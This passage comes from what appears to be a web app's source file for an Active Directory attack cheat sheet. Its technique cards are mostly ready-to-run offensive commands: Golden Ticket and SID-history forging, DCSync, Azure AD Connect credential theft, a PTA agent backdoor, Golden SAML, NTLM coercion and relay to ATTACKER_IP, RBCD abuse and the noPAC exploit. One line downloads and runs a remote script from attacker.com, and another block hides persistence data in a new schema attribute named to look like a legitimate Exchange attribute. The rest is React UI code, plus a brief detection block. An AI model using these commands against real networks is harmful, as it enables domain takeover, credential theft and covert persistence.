    overview: 'Domain and forest trusts extend authentication boundaries between AD domains. Parent/child trust attacks use SID History injection — a Golden Ticket with the Enterprise Admins SID of the root domain in its SIDHistory field grants root domain access from a child domain compromise. Forest trusts with SID filtering disabled allow the same attack cross-forest. The trust key (shared secret between domains) can also be stolen to forge inter-realm tickets without needing the target domain\'s krbtgt.',
    steps: [
      'Enumerate all trusts: direction, type (parent/child, external, forest), and SID filtering status',
      'Parent/Child trust: implicit bidirectional — compromise child domain, forge TGT with Enterprise Admins SID in SID history',
      'SID History injection: add EA SID (S-1-5-21-<ROOT>-519) to Golden Ticket SIDHistory field — cross trust with EA rights',
      'Forest trusts with SID filtering disabled: inject SIDs from the target forest — rare but devastating',
      'One-way trusts: enumerate what we can access from trusted domain — user object in trusting domain\'s foreign security principal',
      'Trust key: the shared secret between domains — steal it, forge inter-realm TGT to cross without krbtgt',
      'Foreign group membership: users from trusted domain in local groups — escalation path',
    ],
    commands: [
      {
        title: 'Trust enumeration and cross-domain escalation',
        code: `# Enumerate all trusts
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType, SIDFiltering
Get-ForestTrust
nltest /domain_trusts /all_trusts /v

# Check SID filtering (critical — if disabled, cross-forest SID injection possible)
Get-DomainTrust | Where-Object { $_.SIDFiltering -eq $false }
# If SIDFiltering is false on a forest trust — SID history injection works across forests

# Parent/Child escalation — Method 1: Golden Ticket with SID History
# Get child domain krbtgt hash via DCSync
mimikatz lsadump::dcsync /domain:child.corp.local /user:krbtgt

# Forge Golden Ticket with Enterprise Admins SID history
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:child.corp.local \
  /sid:S-1-5-21-<CHILD-SID> \
  /krbtgt:<CHILD-KRBTGT-HASH> \
  /sids:S-1-5-21-<ROOT-DOMAIN-SID>-519 \
  /ptt
# S-1-5-21-<ROOT>-519 = Enterprise Admins of root domain

# Access root domain as Enterprise Admin
ls \\parent-dc.corp.local\C$
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator

# Method 2: Trust Key (inter-realm TGT)
# Get trust key from child DC
mimikatz lsadump::trust /patch   # On child DC as SYSTEM
# or DCSync for the inter-realm trust account
mimikatz lsadump::dcsync /domain:child.corp.local /user:CORP$

# Rubeus — forge inter-realm TGT using trust key
execute-assembly /tools/Rubeus.exe asktgt \
  /user:CORP$ \
  /rc4:<TRUST-KEY-HASH> \
  /domain:child.corp.local \
  /dc:child-dc.child.corp.local \
  /nowrap

# Then S4U2Self to impersonate DA across trust
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<INTER-REALM-TGT> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/parent-dc.corp.local \
  /ptt

# Find foreign security principals (users in trusted domain's local groups)
Get-DomainForeignGroupMember
Get-DomainForeignUser`
      }
    ]
  },
  {
    id: 'azure-hybrid',
    title: 'Azure AD Hybrid Attacks',
    subtitle: 'Abuse Azure AD Connect, ADFS, and Pass-Through Authentication for hybrid identity compromise',
    tags: ['Azure AD Connect', 'AADConnect', 'PTA', 'ADFS', 'Golden SAML', 'ADSyncQuery', 'DCSync from cloud'],
    accentColor: 'green',
    overview: 'Hybrid identity infrastructure bridges on-premises AD with Azure AD. Azure AD Connect runs as the MSOL_xxx service account which has DCSync rights on-prem — extracting its credentials from the ADSync SQL database provides domain-wide credential access. PTA (Pass-Through Authentication) agent compromise allows accepting any password for any user. ADFS server compromise enables Golden SAML — forged SAML tokens valid for any federated service indefinitely.',
    steps: [
      'Azure AD Connect: syncs on-prem AD to Azure AD — runs as MSOL_ service account with DCSync rights on-prem',
      'AADInternals/ADSyncQuery: extract credentials from AD Sync database (ADSync SQL local DB) — plaintext passwords to Azure',
      'PTA (Pass-Through Authentication): auth agent on-prem — backdoor the agent to accept any password',
      'ADFS: federated identity — if you compromise the ADFS server, forge Golden SAML assertions for any user',
      'Golden SAML: forge SAML tokens signed with the stolen ADFS token signing certificate — access any federated service as any user',
      'Seamless SSO: AZUREADSSOACC$ machine account — Kerberos silver ticket for Azure AD authentication',
    ],
    commands: [
      {
        title: 'Azure AD Connect credential extraction',
        code: `# AADInternals — extract AAD Connect credentials
Install-Module AADInternals -Force
Import-Module AADInternals

# Get credentials from AD Sync service (requires local admin on AAD Connect server)
Get-AADIntSyncCredentials
# Returns: Username (MSOL_xxx@tenant.onmicrosoft.com) + Password
# The MSOL_ account has DCSync rights on-prem — use to dump all hashes

# ADSyncQuery — SQL-based extraction (no AADInternals dependency)
execute-assembly /tools/ADSyncQuery.exe
# Reads from: C:\ProgramData\Microsoft\AAD\db\ADSync.mdf (LocalDB)
# Returns: encrypted credentials — AADInternals can decrypt

# Use MSOL credentials for DCSync
impacket-secretsdump -just-dc corp.local/MSOL_xyz:Password@DC01

# Pass-Through Authentication (PTA) backdoor
# If you compromise the PTA agent server:
Import-Module AADInternals
Install-AADIntPTASpy   # Backdoor the PTA agent
# Now the agent logs ALL Azure AD login attempts (including passwords)
Get-AADIntPTASpyLog

# Golden SAML — steal ADFS token signing cert + forge assertions
# On ADFS server (requires admin):
Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx
# Forge SAML token for any user
New-AADIntSAMLToken -ImmutableID "<user-immutableid>" \
  -PfxFileName adfs_signing.pfx -PfxPassword "" \
  -Issuer "http://adfs.corp.local/adfs/services/trust" \
  -UseBuiltInCertificate

# Seamless SSO silver ticket (AZUREADSSOACC$)
# Get AZUREADSSOACC$ hash via DCSync
mimikatz lsadump::dcsync /domain:corp.local /user:AZUREADSSOACC$
# Forge silver ticket for https://autologon.microsoftazuread-sso.com
mimikatz kerberos::golden \
  /user:victim@corp.local \
  /domain:corp.local \
  /sid:S-1-5-21-... \
  /rc4:<AZUREADSSOACC_NTLM_HASH> \
  /target:autologon.microsoftazuread-sso.com \
  /service:http \
  /ptt`
      }
    ]
  },
  {
    id: 'coercion',
    title: 'Authentication Coercion — Full Protocol Coverage',
    subtitle: 'Force domain computers to authenticate to attacker-controlled machine using multiple Windows protocols',
    tags: ['PrintNightmare', 'MS-RPRN', 'PetitPotam', 'MS-EFSRPC', 'Coercer', 'DFSCOERCE', 'WebDAV', 'NTLM relay'],
    accentColor: 'green',
    overview: 'Authentication coercion techniques force a target computer to initiate an outbound NTLM or Kerberos authentication to an attacker-controlled host. Multiple Windows protocols can be abused for this: MS-RPRN (Print Spooler), MS-EFSRPC (Encrypted File System), MS-DFSNM (DFS Namespace Manager). The captured authentication can be relayed to LDAP (grant DCSync), ADCS HTTP enrollment (get DC certificate), or used on an Unconstrained Delegation host to capture a TGT. Coercer automates all known techniques in one scan.',
    steps: [
      'MS-RPRN (Printer Bug / SpoolSample): call RpcRemoteFindFirstPrinterChangeNotification — coerce any host running Spooler',
      'MS-EFSRPC (PetitPotam): call EfsRpcOpenFileRaw — coerces LSASS authentication, including domain controllers',
      'DFSCoerce: MS-DFSNM NetrDfsAddStdRoot — coerce DC over DFS namespace manager',
      'MS-FSRVP: ShadowCopyAgentInterface coercion — less common but effective',
      'Coercer: automated tool that tries all known coercion techniques against a target',
      'Combine with relay: coerce → NTLM relay to LDAP/ADCS → grant DCSync / get domain controller cert',
      'Coercion + Unconstrained Delegation: coerce DC → TGT captured on UD host → DCSync',
    ],
    commands: [
      {
        title: 'Coercion techniques and relay chains',
        code: `# Coercer — try all known coercion methods automatically
pip3 install coercer
coercer scan -t DC01.corp.local -u user -p Password -d corp.local  # Check what's exploitable
coercer coerce -t DC01.corp.local -l ATTACKER_IP -u user -p Password -d corp.local

# MS-RPRN (Printer Bug) — SpoolSample
execute-assembly /tools/SpoolSample.exe DC01.corp.local ATTACKER_MACHINE.corp.local
# Or Python:
python3 SpoolSample.py corp.local/user:Password ATTACKER_IP DC01.corp.local

# PetitPotam (MS-EFSRPC) — unauthenticated on older DCs
python3 PetitPotam.py -u "" -p "" ATTACKER_IP DC01.corp.local  # Unauthenticated
python3 PetitPotam.py -u user -p Password ATTACKER_IP DC01.corp.local  # Authenticated

# DFSCoerce
python3 dfscoerce.py -u user -p Password -d corp.local ATTACKER_IP DC01.corp.local

# Relay to ADCS HTTP (coerce DC → get DC certificate → DCSync via PKINIT)
# Terminal 1: start relay
impacket-ntlmrelayx -t http://CA.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
# Terminal 2: coerce DC
python3 PetitPotam.py ATTACKER_IP DC01.corp.local
# Result: DC certificate in base64 — use with Rubeus

# Use DC certificate for DCSync
execute-assembly /tools/Rubeus.exe asktgt \
  /user:DC01$ /certificate:<base64-cert> /domain:corp.local /getcredentials /ptt
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt

# Relay to LDAP — grant DCSync rights
impacket-ntlmrelayx -t ldap://DC01.corp.local --escalate-user attacker --no-smb-server
# Then coerce any DC to authenticate to ATTACKER_IP

# WebDAV coercion — works even when SMB signing is required
# Force auth via WebDAV (HTTP) — SMB signing doesn't apply
python3 webclientservicescanner.py corp.local/user:Password -dc-ip DC01 10.10.10.0/24
# If WebClient service is running — use @80 syntax:
# Responder -I eth0 -wP
# SpoolSample target ATTACKER@80/share`
      }
    ]
  },
  {
    id: 'rbcd-deep',
    title: 'RBCD — Resource-Based Constrained Delegation Deep Dive',
    subtitle: 'Multiple paths to RBCD — GenericWrite, LAPS write, computer account creation, and cross-domain scenarios',
    tags: ['RBCD', 'GenericWrite', 'MachineAccountQuota', 'msDS-AllowedToActOnBehalfOfOtherIdentity', 'Rubeus S4U', 'computer account'],
    accentColor: 'green',
    overview: 'This deep-dive covers the full RBCD attack surface beyond the basic GenericWrite scenario — including computer creation via MachineAccountQuota, cross-domain RBCD, and using existing compromised machine accounts as the delegation source. The key insight is that any principal with write access to a computer object\'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute can impersonate any user to any service on that computer, without touching Kerberos constrained delegation configuration on the DC.',
    steps: [
      'RBCD requires writing msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object',
      'Prerequisite: GenericAll, GenericWrite, WriteProperty, or AllowedToAct on the target computer',
      'Need a principal with SPN: use existing computer account, create one via MachineAccountQuota, or abuse MSA/GMSA',
      'MachineAccountQuota (default 10): any domain user can create up to 10 computer accounts — creates an account with arbitrary SPN',
      'After writing: S4U2Self (get service ticket for any user to our account) → S4U2Proxy (exchange for ticket to target service)',
      'Cross-domain RBCD: if trust allows and target computer trusts our account — works across parent/child domains',
      'Cleanup: must clear msDS-AllowedToActOnBehalfOfOtherIdentity after exploitation or leave as persistence',
    ],
    commands: [
      {
        title: 'Full RBCD attack chain',
        code: `# Step 1: Check MachineAccountQuota (default = 10, must be > 0)
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota

# Step 2a: Create attacker computer account (via Powermad)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Powermad.ps1')
New-MachineAccount -MachineAccount "ATTACKER" -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
Get-DomainComputer ATTACKER -Properties objectsid
# Note the SID: S-1-5-21-...-XXXX

# Step 2b: Alternative — use existing computer account you control
# (e.g., already compromised workstation)

# Step 3: Write RBCD on target computer
$AttackerSID = Get-DomainComputer ATTACKER -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \`
  -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)'
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject \`
  -Set '@{msds-allowedtoactonbehalfofotheridentity = $SDBytes}'

# Step 4: Get TGT for ATTACKER$
execute-assembly /tools/Rubeus.exe asktgt \
  /user:ATTACKER$ /password:Pass123! /domain:corp.local /nowrap

# Step 5: S4U2Self + S4U2Proxy
execute-assembly /tools/Rubeus.exe s4u \
  /ticket:<TGT-BASE64> \
  /impersonateuser:Administrator \
  /msdsspn:cifs/TARGET.corp.local \
  /ptt /nowrap

# Access target as Administrator
ls \\TARGET.corp.local\C$

# Cleanup
Set-DomainObject TARGET -Clear 'msds-allowedtoactonbehalfofotheridentity'

# impacket version (Linux)
impacket-addcomputer corp.local/user:Password -computer-name ATTACKER -computer-pass Pass123!
# Write RBCD via LDAP
python3 rbcd.py -f ATTACKER -t TARGET -dc-ip DC01 corp.local/user:Password
# S4U
impacket-getST -spn cifs/TARGET.corp.local corp.local/ATTACKER$:Pass123! \
  -impersonate Administrator -dc-ip DC01
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET.corp.local`
      }
    ]
  },
  {
    id: 'nopac',
    title: 'noPAC — samAccountName Impersonation (CVE-2021-42278/42287)',
    subtitle: 'Exploit machine account name collision to get a TGT as a Domain Controller, achieving domain compromise',
    tags: ['noPAC', 'CVE-2021-42278', 'CVE-2021-42287', 'samAccountName', 'machine account', 'KDC exploit'],
    accentColor: 'green',
    overview: 'noPAC chains two CVEs: CVE-2021-42278 (machine account names lack $ enforcement — can be renamed to match a DC) and CVE-2021-42287 (when a TGS references a non-existent account, KDC searches for DC_NAME$ — collision). The combined effect is that a standard domain user can request a TGT as the Domain Controller, enabling DCSync. The exploit is fully automated by noPac.py and requires only MachineAccountQuota > 0. Patched by KB5008380/KB5008602.',
    steps: [
      'CVE-2021-42278: machine account names should end in $ but this is not enforced — rename machine account to DC name',
      'CVE-2021-42287: when a TGS request references a non-existent account, the KDC searches for DC_NAME$ — collision',
      'Combined: create machine account, rename it to DC01 (without $), request TGT, rename back, request TGS for DC — get DC service ticket as DA',
      'Requires: MachineAccountQuota > 0 (default: 10) or existing machine account credentials',
      'noPAC exploit is fully automated by several PoC tools (noPac.py, Sam_The_Admin)',
      'Fully patched with KB5008380/KB5008602 — always check patch level before attempting',
      'Produces a TGT/TGS as the Domain Controller — can perform DCSync, access anything',
    ],
    commands: [
      {
        title: 'noPAC exploitation',
        code: `# Check if vulnerable (unpatched DC)
nmap -p 88 --script krb5-enum-users DC01.corp.local
# Or check machine account quota:
Get-DomainObject -Identity "DC=corp,DC=local" -Properties ms-ds-machineaccountquota

# noPac.py (Linux) — automated exploit
git clone https://github.com/Ridter/noPac
pip3 install -r requirements.txt

# Check if vulnerable
python3 noPac.py corp.local/user:Password -dc-ip DC01 --check

# Exploit — get shell via smbexec (as SYSTEM on DC)
python3 noPac.py corp.local/user:Password -dc-ip DC01 \
  -dc-host DC01 --impersonate Administrator -shell

# Exploit — DCSync (dump krbtgt hash)
python3 noPac.py corp.local/user:Password -dc-ip DC01 \
  -dc-host DC01 --impersonate Administrator \
  -use-ldap -dump

# Sam_The_Admin alternative
git clone https://github.com/WazeHell/sam-the-admin
python3 sam_the_admin.py "corp.local/user:Password" \
  -dc-ip DC01 -shell

# Manual approach (understanding the bug):
# 1. Create machine account
impacket-addcomputer corp.local/user:Password -computer-name TEMPCOMP -computer-pass TempPass123
# 2. Rename machine account samAccountName to DC01 (without $)
python3 -c "
from impacket.examples.ldap_shell import LdapShell
# Use LDAP to change samAccountName of TEMPCOMP$ to DC01
"
# 3. Request TGT as DC01
impacket-getTGT corp.local/DC01:TempPass123 -dc-ip DC01
# 4. Rename back to TEMPCOMP
# 5. Use TGT to get ST for DC01 — KDC searches for DC01$ (actual DC) — collision
export KRB5CCNAME=DC01.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc`
      }
    ]
  },
  {
    id: 'schema-abuse',
    title: 'Global Schema Abuse — Schema Admin Attacks',
    subtitle: 'Abuse Schema Admin role to modify the AD schema for persistence, privilege escalation, and attribute injection',
    tags: ['Schema Admin', 'AD schema', 'attribute injection', 'lDAPDisplayName', 'schema persistence', 'adminDescription', 'attributeSchema'],
    accentColor: 'purple',
    overview: 'The AD Schema is the forest-wide blueprint defining every object class and attribute. Schema Admins can add new attributes to any class — including User — and inject data into those attributes on any object. This provides a covert, schema-level persistence channel: encrypted beacon configuration, access tokens, or backdoor data stored directly in AD itself, surviving DC rebuilds, password resets, and Group Policy changes. Schema changes are permanent (only deactivatable, not deletable) and rarely audited.',
    steps: [
      'The Active Directory Schema defines every object class and attribute in the forest — changes are forest-wide and permanent (deletions require tombstoning)',
      'Schema Admins group: only members can modify the AD schema — compromise of a Schema Admin = forest-level persistence',
      'Schema modification requires: Schema Admin group membership + Schema Master FSMO role DC access',
      'Attribute injection: add custom attributes to existing object classes (e.g., user) — store encrypted payloads, backdoor data, or hidden credentials in AD itself',
      'lDAPDisplayName spoofing: create schema attributes with names mimicking legitimate MS attributes — harder to detect in enumeration',
      'Schema-based persistence: modify the User class to add an attribute that stores encrypted beacon config or access tokens — survives all password resets',
      'Escalation path: if you have GenericAll on Schema Admins group or WriteDACL on schema partition → add yourself to Schema Admins',
      'Immediate schema changes: after adding to Schema Admins, reload schema via Schema snap-in or LDAP write to CN=Schema,CN=Configuration',
    ],
    commands: [
      {
        title: 'Schema enumeration and Schema Admin path',
        code: `# Enumerate Schema Admins group members
Get-DomainGroupMember "Schema Admins" -Recurse | Select-Object MemberName, MemberSID
net group "Schema Admins" /domain

# Find path to Schema Admins via BloodHound
# Cypher: MATCH p=shortestPath((u:User {name:"ATTACKER@CORP.LOCAL"})-[*1..]->(g:Group {name:"SCHEMA ADMINS@CORP.LOCAL"})) RETURN p

# Add yourself to Schema Admins (requires GenericAll on group or DA)
Add-DomainGroupMember -Identity "Schema Admins" -Members attacker

# Verify
Get-DomainGroupMember "Schema Admins" | Where-Object {$_.MemberName -eq "attacker"}

# Find Schema Master FSMO role holder
netdom query fsmo | grep "Schema master"
Get-ADDomain | Select-Object InfrastructureMaster
# or:
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner`
      },
      {
        title: 'Schema attribute injection for persistence',
        code: `# === Add custom attribute to User class (forest-wide persistence) ===
# This stores attacker-controlled data in every user object
# Survives domain controller rebuilds, password resets, and GPO changes

# Step 1: Create new attributeSchema object
$schemaPath = "CN=Schema,CN=Configuration,DC=corp,DC=local"
$attrName   = "msExch-EmployeeID-Ext"   # Looks like a legitimate Exchange attribute
$oid        = "1.2.840.113556.1.8000.2554.99999.1"  # Custom OID

$schemaEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$schemaPath")
$newAttr = $schemaEntry.Children.Add("CN=$attrName", "attributeSchema")
$newAttr.Properties["lDAPDisplayName"].Value     = $attrName
$newAttr.Properties["attributeID"].Value         = $oid
$newAttr.Properties["attributeSyntax"].Value     = "2.5.5.10"    # Octet string
$newAttr.Properties["oMSyntax"].Value            = 4             # Octet string
$newAttr.Properties["isSingleValued"].Value      = $true
$newAttr.Properties["searchFields"].Value        = 0             # Not indexed (stealthy)
$newAttr.CommitChanges()

# Step 2: Add attribute to User class (via classSchema modification)
$userClass = [ADSI]"LDAP://CN=User,CN=Schema,CN=Configuration,DC=corp,DC=local"
$attrDN = "CN=$attrName,CN=Schema,CN=Configuration,DC=corp,DC=local"
$userClass.Properties["mayContain"].Add($attrDN)
$userClass.CommitChanges()

# Step 3: Force schema reload (on Schema Master)
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Properties["schemaUpdateNow"].Value = 1
$rootDSE.CommitChanges()

# Step 4: Store encrypted payload in the attribute on a target user
$user = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=corp,DC=local"
$encPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("backdoor-config-here"))
$user.Properties[$attrName].Value = [System.Convert]::FromBase64String($encPayload)
$user.CommitChanges()

# Read back the attribute later
(Get-ADUser Administrator -Properties $attrName).$attrName

# === Schema-based DCSync persistence ===
# If you have Schema Admin rights — modify msDS-AllowedToActOnBehalfOfOtherIdentity schema defaults
# or add DS-Replication-Get-Changes right to all future users via adminDescription default values`
      },
      {
        title: 'Detecting and cleaning up schema changes',
        code: `# Enumerate all non-default schema attributes (find attacker-added ones)
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" \
  -Filter {objectClass -eq "attributeSchema"} \
  -Properties lDAPDisplayName, attributeID, whenCreated |
  Where-Object {$_.whenCreated -gt (Get-Date).AddDays(-30)} |  # Recent additions
  Select-Object lDAPDisplayName, attributeID, whenCreated | Sort-Object whenCreated

# Look for OIDs not in Microsoft's reserved range (1.2.840.113556.1.*)
Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" \
  -Filter {objectClass -eq "attributeSchema"} \
  -Properties lDAPDisplayName, attributeID |
  Where-Object {$_.attributeID -notlike "1.2.840.113556.1.*"} |
  Select-Object lDAPDisplayName, attributeID

# Note: schema objects cannot be deleted — only deactivated (isDefunct = TRUE)
# To deactivate (not delete) attacker-added attribute:
$attr = Get-ADObject -Filter {lDAPDisplayName -eq "msExch-EmployeeID-Ext"} \
  -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local"
Set-ADObject $attr -Replace @{isDefunct = $true}
# Forces schema reload
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Properties["schemaUpdateNow"].Value = 1
$rootDSE.CommitChanges()`
      }
    ]
  },
];

const colorOptions = [
  { value: 'cyan', name: 'Cyan' },{ value: 'green', name: 'Green' },{ value: 'red', name: 'Red' },{ value: 'purple', name: 'Purple' },
  { value: 'orange', name: 'Orange' },{ value: 'pink', name: 'Pink' },{ value: 'blue', name: 'Blue' },{ value: 'yellow', name: 'Yellow' },
];
const colorPreview = { cyan:'bg-cyan-500', green:'bg-emerald-500', red:'bg-red-500', purple:'bg-purple-500', orange:'bg-orange-500', pink:'bg-pink-500', blue:'bg-blue-500', yellow:'bg-yellow-500' };
const headerColorMap = { cyan:'text-cyan-400 border-cyan-500/30', green:'text-emerald-400 border-emerald-500/30', red:'text-red-400 border-red-500/30', purple:'text-purple-400 border-purple-500/30', orange:'text-orange-400 border-orange-500/30', pink:'text-pink-400 border-pink-500/30', blue:'text-blue-400 border-blue-500/30', yellow:'text-yellow-400 border-yellow-500/30' };

export default function ADAttacks() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('adattacks', initialMapColumns, techniques);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (i) => setColumns(columns.filter((_, idx) => idx !== i));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };

  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Active Directory </span><span className="text-cyan-400">Attacks</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Kerberoasting • Delegation Abuse • ADCS ESC1-13 • GPO Creds • ACL Abuse • Schema Attacks • SQL Chains • SCCM • Trust Attacks • Azure Hybrid • Coercion</p>
      </div>

      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
                  <button onClick={() => handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"><X className="w-3 h-3" /></button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode title={node.title} subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle} accentColor={color} onClick={() => scrollTo(node.id)} small />
                      </div>
                      <button onClick={() => handleDeleteTopic(i, j)} className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3" /></button>
                    </div>
                  ))}
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input type="text" value={topicTitle} onChange={e => setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => { if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <input type="text" value={topicTags} onChange={e => setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" onKeyDown={e => { if (e.key === 'Enter') handleAddTopic(i); if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <div className="flex gap-1">
                        <button onClick={() => handleAddTopic(i)} className="flex-1 px-2 py-1 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors">Add</button>
                        <button onClick={() => { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); }} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors">Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <button onClick={() => setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors">+ Add Topic</button>
                  )}
                </div>
              </div>
            );
          })}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all">
              <Plus className="w-6 h-6 text-slate-500" /><span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input type="text" value={columnName} onChange={e => setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => e.key === 'Enter' && handleNameSubmit()} />
                <div className="flex gap-2">
                  <button onClick={() => setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Cancel</button>
                  <button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold">Next</button>
                </div>
              </div>
            )}
            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map(option => (
                    <button key={option.value} onClick={() => setSelectedColor(option.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${selectedColor === option.value ? `${colorPreview[option.value]} text-slate-900` : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />{option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Back</button>
                  <button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold">Create</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}